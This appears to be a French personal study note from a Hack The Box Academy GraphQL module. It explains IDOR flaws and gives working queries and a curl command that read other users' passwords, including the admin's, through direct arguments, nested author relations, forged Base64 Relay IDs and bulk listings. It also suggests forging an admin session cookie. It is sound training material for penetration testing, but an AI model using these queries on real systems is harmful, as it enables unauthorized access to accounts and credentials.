---
titre: "IDOR — Insecure Direct Object Reference"
aliases:
  - "IDOR — Insecure Direct Object Reference"
plateforme: "Hack The Box Academy"
module: "Attacking GraphQL"
date: 2026-07-06
tags: [HTB, GraphQL, IDOR, Authorization, BrokenAccess, Notes]
---

# 🔓 IDOR — Insecure Direct Object Reference

Lié : [[Attacking GraphQL - Index]] · [[03 - Introspection et Information Disclosure]] · [[05 - Injection Attacks]]

---

## Le concept

**IDOR** = l'application te laisse accéder à un objet **en référençant directement son identifiant**, **sans vérifier que tu as le droit** d'y accéder.

La distinction fondamentale :
- **Authentification** = *qui es-tu ?* (login)
- **Autorisation** = *as-tu le droit d'accéder à CETTE ressource ?* (contrôle par objet)

Un IDOR est une **faille d'autorisation** : tu es connecté en `htb-stdnt`, mais le serveur ne vérifie pas que la donnée demandée t'appartient.

---

## Pourquoi GraphQL y est particulièrement exposé

Le **client contrôle les arguments** de la query. Si `user(username: "...")` est disponible, rien n'empêche de mettre le username d'un autre. Si le resolver ne re-vérifie pas « l'utilisateur connecté a-t-il le droit de voir CE user ? » → IDOR.

---

## IDOR direct (changer l'identifiant)

La query légitime (profil de l'utilisateur connecté) :
```graphql
{ user(username: "htb-stdnt") { username role } }
```

L'exploitation (on met un autre username) :
```graphql
{ user(username: "admin") { username password } }
```
→ Si ça répond sans erreur d'autorisation → IDOR confirmé.

**En JSON/curl** (attention à l'échappement des `"`) :
```bash
curl -s -X POST http://<TARGET>/graphql \
  -H "Content-Type: application/json" \
  -H "Cookie: session=<cookie>" \
  -d '{"query":"{ user(username: \"admin\") { username password } }"}'
```

---

## IDOR par sous-requête (chemin détourné) ⭐

C'est la technique la plus puissante et souvent oubliée par les défenseurs. Au lieu d'attaquer la query `user`, on passe par une **relation** :

```graphql
{
  posts {
    title
    author {           ← on traverse la relation post → author
      username
      password         ← on atteint le champ sensible par un chemin détourné
    }
  }
}
```

→ On lit le `password` de **tous les auteurs**, sans jamais fournir d'identifiant. Le serveur protège peut-être `user(username:)` mais oublie que `posts.author` expose les mêmes données.

### Cas du lab (section 3)

La requête originale du front :
```graphql
{ posts { uuid title body category author { username } } }
```

Remplacer `username` par `password` dans la sous-requête → flag de l'admin exfiltré via les 4 premiers posts dont il est l'auteur.

**Leçon** : vers une même donnée sensible, tester **TOUS** les chemins (query directe + sous-requêtes via relations).

---

## IDOR par Global ID (Relay)

Les Global IDs Relay sont prévisibles (`TypeObject:n` en Base64). Si la query `node(id: "...")` existe :

```bash
# Forger l'ID de l'objet n°2
echo -n "UserObject:2" | base64
# → VXNlck9iamVjdDoy

# Accéder à l'objet
```
```graphql
{ node(id: "VXNlck9iamVjdDoy") { ... on UserObject { username password } } }
```

---

## Énumérer les objets (IDOR en masse)

Si une query sans argument liste tout (`allEmployees`, `users`) :
```graphql
{ allEmployees { username employeeId role } }
```
→ Pas besoin de deviner les identifiants, tout est servi. Vérifier si le **contrôle d'accès** filtre selon le rôle de l'utilisateur connecté (souvent : non).

---

## Détection et réflexe

| Signal | Réflexe |
|---|---|
| Un argument `id`, `username`, `email`… | Changer la valeur pour celle d'un autre user |
| Une relation `author`, `owner`, `createdBy`… | Demander les champs sensibles via la sous-requête |
| Un Global ID en Base64 | Décoder, incrémenter, ré-encoder |
| Une query qui liste tout (`allUsers`) | Vérifier qu'elle filtre selon le rôle |

---

## Cookie de session — bonus

Décoder le cookie peut révéler le mécanisme d'auth :
```bash
echo "eyJyb2xlIjoidXNlciIsInVzZXIiOiJodGItc3RkbnQifQ" | base64 -d
# → {"role":"user","user":"htb-stdnt"}
```
Si le cookie est mal signé, on peut tenter de forger `"role":"admin"`. À combiner avec les mutations ([[07 - Mutations et Escalade de Privileges]]).
